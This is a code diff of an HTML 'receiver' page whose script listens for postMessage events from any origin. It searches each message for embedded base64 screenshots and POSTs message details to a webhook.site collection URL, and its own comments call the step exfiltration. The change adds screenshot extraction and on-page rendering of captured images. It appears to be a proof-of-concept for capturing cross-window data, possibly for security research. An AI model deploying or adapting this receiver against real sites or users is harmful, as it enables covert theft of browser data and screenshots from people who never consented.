@@ -3,25 +3,44 @@
   <body>
     <h1>Receiver Loaded</h1>
     <script>
-      // REPLACE WITH YOUR REAL WEBHOOK URL
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322";
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with your real one
+
+      function deepFindScreenshot(obj) {
+        const str = JSON.stringify(obj);
+        const match = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+        return match ? match[0] : null;
+      }
 
       window.addEventListener("message", (e) => {
         try {
-          // Immediately send the raw message to webhook
+          const data = e.data;
+          const screenshot = deepFindScreenshot(data);
+
+          // Immediately exfiltrate the entire message
           fetch(webhookURL, {
             method: "POST",
-            mode: "no-cors", // to avoid CORS blocking
+            mode: "no-cors",
             body: JSON.stringify({
-              receivedAt: new Date().toISOString(),
-              message: e.data
+              timestamp: new Date().toISOString(),
+              screenshot: screenshot ? "[REDACTED_IMAGE]" : null,
+              messageKeys: Object.keys(data || {}),
+              messageSize: JSON.stringify(data).length
             })
           });
 
-          // Log basic metadata (won’t cause crash)
-          console.log("📤 Sent to webhook. Keys:", Object.keys(e.data || {}));
+          if (screenshot) {
+            const img = new Image();
+            img.src = screenshot;
+            img.style.maxWidth = "300px";
+            img.style.border = "2px solid red";
+            document.body.appendChild(img);
+            console.log("✅ Screenshot captured and rendered.");
+          } else {
+            console.log("📦 Message received — no screenshot found.");
+          }
+
         } catch (err) {
-          console.error("Exfiltration error:", err);
+          console.error("⚠️ Error in receiver:", err);
         }
       }, false);
     </script>
